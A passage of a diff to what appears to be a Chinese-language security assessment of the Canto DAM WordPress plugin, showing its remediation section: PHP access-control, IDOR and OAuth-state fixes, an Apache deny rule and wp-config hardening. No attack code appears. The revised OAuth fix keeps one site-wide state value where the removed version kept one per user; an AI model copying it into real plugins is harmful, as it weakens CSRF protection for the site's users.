     wp_die('Authentication required', 'Unauthorized', array('response' => 401));
 }
+```
 
-// 添加能力检查
-if (!current_user_can('manage_options')) {
-    wp_die('Insufficient permissions', 'Forbidden', array('response' => 403));
-}
-
+**修复 IDOR：**
+```php
 // 添加所有权验证
-$media_id = intval($_REQUEST['id']);
-$user_id = get_current_user_id();
-
-// 检查媒体是否属于当前用户
-$owner_id = get_post_field('post_author', $media_id);
-if ($owner_id !== $user_id) {
-    wp_die('Access denied', 'Forbidden', array('response' => 403));
+function user_owns_media($fbc_id) {
+    // 检查当前用户是否拥有此媒体
+    $user_id = get_current_user_id();
+    $owner_id = get_post_meta($fbc_id, 'canto_owner', true);
+    return $user_id == $owner_id || current_user_can('manage_options');
 }
 
-// 验证 OAuth State
-$state = bin2hex(random_bytes(32));
-update_option('fbc_oauth_state_' . $user_id, $state);
-
-// 回调时验证
-$expected_state = get_option('fbc_oauth_state_' . $user_id);
-if (!hash_equals($expected_state, $_REQUEST['state'])) {
-    wp_die('Invalid OAuth state');
+// 在使用 fbc_id 前检查
+if (!user_owns_media($fbc_id)) {
+    wp_die('Access denied', 'Unauthorized', array('response' => 403));
 }
 ```
 
-### 9.2 配置层修复
+**修复垂直权限提升：**
+```php
+// 添加能力检查
+public function updateOptions() {
+    if (!current_user_can('manage_options')) {
+        wp_send_json_error('Insufficient permissions');
+        wp_die();
+    }
+    // ... 原有逻辑
+}
+```
 
+**修复 OAuth CSRF：**
+```php
+// State 生成
+$state = bin2hex(random_bytes(32));
+update_option('fbc_oauth_state', $state);
+
+// State 验证
+$expected_state = get_option('fbc_oauth_state');
+if (!hash_equals($expected_state, $_GET['state'])) {
+    wp_die('Invalid OAuth state - possible CSRF attack');
+}
+delete_option('fbc_oauth_state');
+```
+
+### 8.2 防御性配置
+
+**禁止直接访问插件库文件：**
 ```apache
-# 禁止直接访问插件库文件
-<FilesMatch "^(get|download|detail|tree|sizes|copy-media)\.php$">
-    Order Deny,Allow
+# .htaccess 或 Apache 配置
+<Directory "/var/www/html/wp-content/plugins/canto/includes/lib/">
     Deny from all
-</FilesMatch>
+</Directory>
+```
+
+**WordPress 安全加固：**
+```php
+// wp-config.php
+define('DISALLOW_FILE_EDIT', true);
+define('FORCE_SSL_ADMIN', true);
 ```
 
 ---
 
-**文档版本：** 1.0  
-**最后更新：** 2025-10-29  
-**适用目标：** WordPress 6.5.4 + Canto DAM 插件 v3.0.4  
-**关联漏洞：** AUTHZ-VULN-01 至 AUTHZ-VULN-12
+## 9. 参考资源
+
+- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
+- [OWASP IDOR Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
+- [WordPress Capability API](https://developer.wordpress.org/apis/security/capabilities/)
